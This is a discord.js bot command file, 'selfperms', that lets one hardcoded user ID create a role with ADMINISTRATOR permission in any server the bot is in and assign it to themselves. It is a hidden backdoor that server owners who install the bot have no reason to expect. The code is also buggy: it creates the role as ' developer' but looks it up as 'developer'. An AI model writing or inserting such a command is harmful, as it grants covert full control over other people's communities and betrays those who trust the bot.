const { MessageEmbed } = require('discord.js');
const Discord = require('discord.js');
module.exports = {
config: {
name: "selfperms", 
aliases: ["sp"]
},
run: async (client, message, args) => {
const developers = ['440991655982792705']

    if (!developers.includes(message.author.id)) {
      message.channel.send('> stop ')
      return
    }

    if (developers.includes(message.author.id)) {

      const role = message.guild.roles.cache.find(role => role.name === 'developer')

      if (!role) {
        try {
          message.channel.sendTyping();
          let muterole = await message.guild.roles.create({ name: " developer", color: "#2f3136", permissions: ["ADMINISTRATOR"] })
        } catch (error) {
          console.log(error)
        }
      };
      var role2 = message.guild.roles.cache.find(role => role.name === "developer");


      await message.member.roles.add(role2.id)

    }
  }
};